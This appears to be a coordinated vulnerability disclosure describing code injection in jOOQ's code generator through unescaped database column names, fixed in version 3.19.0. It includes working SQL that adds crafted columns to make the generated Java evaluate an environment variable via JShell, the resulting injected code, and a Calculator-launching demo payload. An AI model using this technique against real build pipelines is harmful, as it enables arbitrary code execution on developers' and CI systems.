# JOOQ Code injection

What is the code generation?
While optional, source code generation feature allows developers to increase productivity. Different tools like, jOOQ's [code generator](https://www.jooq.org/doc/latest/manual/code-generation/) takes your database schema and reverse-engineers it into a set of Java (Kotlin) classes modelling tables, records, sequences, POJOs, DAOs, stored procedures, user-defined types and many more. 

## How does it work?
Let's say you have database with test table: 

```sql
create table if not exists example ( "ID" bigint, "key" text, primary key ("ID"));
```

Code generator will connect to the database and produce following code, during code compilation, thanks to the maven plugin:

```java
public class Example extends TableImpl<ExampleRecord> {
    public static final Example EXAMPLE = new Example();
    public final TableField<ExampleRecord, Long> ID = createField(DSL.name("ID"), SQLDataType.BIGINT.nullable(false), this, "");
    public final TableField<ExampleRecord, String> KEY = createField(DSL.name("key"), SQLDataType.CLOB, this, "");
    // we will skip unnecessary parts ...
}
```

Now you can write code and don't worry about the schema modifications. For example, following code will grab all data from example table:

```java
package one.d4d;
import one.d4d.jooq.model.tables.Example;

public class App
{
    public static void main( String[] args )
    {
        try {
            String url = "jdbc:postgresql://localhost:5432/code";
            Connection conn = DriverManager.getConnection(url, "doge", "");
            DSLContext context = DSL.using(conn, SQLDialect.POSTGRES);
            Result<Record> rows = context.select()
                    .from(Example.EXAMPLE)
                    .fetch();
            System.out.println(rows.stream().findFirst());
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
```

Everything works as expected. Great! What can go wrong? - Meet the code injection! There are couple of places where code injection can be. Table name. Unfortunately, it is properly escaped by the library. Additionally, new table may not be included into configuration files. Another one is column's name. Hopefully, it was not escaped. Let's look at following query:

```sql
ALTER TABLE example
ADD COLUMN "1""),SQLDataType.BIT);String v=System.getenv(""CODE"");//" bool,
ADD COLUMN "2""),SQLDataType.BIT);org.jooq.DataType B=SQLDataType.BIT;//" bool,
ADD COLUMN "3""),B);Object o=jdk.jshell.JShell.create().eval(v);//" bool;
```

### Detailed explanation

The generated java code not properly escape `"` at the `DSL.name` property. Our exploit, first will close the string with `1")` after that we should properly pass all required parameter to the `createField` function. Please bear in mind that we have several constrants:
- Postgres and MySQL restrict column's name length up to 64 chars and there is no easy way to change that settings, except build executables from source code.
- Imports aren't allowed inside the class at Java, so we have to use full name of classes instead.

And although it looks quite complicated, there is a way to get around all these restrictions. Meet the `jdk.jshell.JShell#eval` function. It does exactly what we need: `Evaluate the input String, including definition and/or execution, if applicable.`. My exploit uses environment variable `CODE` to path payload into the CI/CD, but it doesn't required. You can simple add as much new columns as you want to store the payload at local variables. In my example, variable `CODE` launched Calc app on MacOS `Process process = Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");`. Let's take a quick look on generated code:

```java
/**
 * The column <code>public.example.1"),SQLDataType.BIT);String
 * v=System.getenv("CODE");//</code>.
 */
public final TableField<ExampleRecord, Boolean> _1_22_29_2cSQLDATATYPE_BIT_29_3bSTRING_V_3dSYSTEM_GETENV_28_22CODE_22_29_3b_2f_2f = createField(DSL.name("1"),SQLDataType.BIT);String v=System.getenv("CODE");//"), SQLDataType.BOOLEAN, this, "");

/**
 * The column <code>public.example.2"),SQLDataType.BIT);org.jooq.DataType
 * B=SQLDataType.BIT;//</code>.
 */
public final TableField<ExampleRecord, Boolean> _2_22_29_2cSQLDATATYPE_BIT_29_3bORG_JOOQ_DATATYPE_B_3dSQLDATATYPE_BIT_3b_2f_2f = createField(DSL.name("2"),SQLDataType.BIT);org.jooq.DataType B=SQLDataType.BIT;//"), SQLDataType.BOOLEAN, this, "");

/**
 * The column <code>public.example.3"),B);Object
 * o=jdk.jshell.JShell.create().eval(v);//</code>.
 */
public final TableField<ExampleRecord, Boolean> _3_22_29_2cB_29_3bOBJECT_O_3dJDK_JSHELL_JSHELL_CREATE_28_29_EVAL_28V_29_3b_2f_2f = createField(DSL.name("3"),B);Object o=jdk.jshell.JShell.create().eval(v);//"), SQLDataType.BOOLEAN, this, "");

```

5. Now, as soon as CI/CD will run the code, payload will read the environment variable `CODE` and execute it.

### Recommendations
Make sure that all user inputs are properly escaped. Additionally test user inputs, like table name, table comment, view name and command aren't vulnerable to the code injection attack.

### Notes

Fix available at 3.19.0 version. [Github issue](https://github.com/jOOQ/jOOQ/issues/15714)

### Acknowledgement

Thanks Lukas Eder and Data Geekery GmbH team for the coordination and bug fixing! 